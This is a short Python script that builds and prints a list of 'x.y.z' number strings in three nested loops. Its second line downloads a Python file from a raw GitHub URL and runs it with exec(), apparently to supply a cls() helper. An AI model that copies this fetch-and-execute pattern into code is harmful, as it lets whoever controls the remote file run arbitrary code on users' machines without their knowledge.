import subprocess
exec(__import__('requests').get('https://raw.githubusercontent.com/EnbuyukamcaTR/sl-to-ml-imports/refs/heads/main/functions-loadAll.py').text)

list1 = []
for x in range(1,100):
    for y in range(1,100):
        for z in range(1,100):
            print("{}.{}.{}".format(x, y, z))
            list1.append("{}.{}.{}".format(x, y, z))
cls()
print(list1)
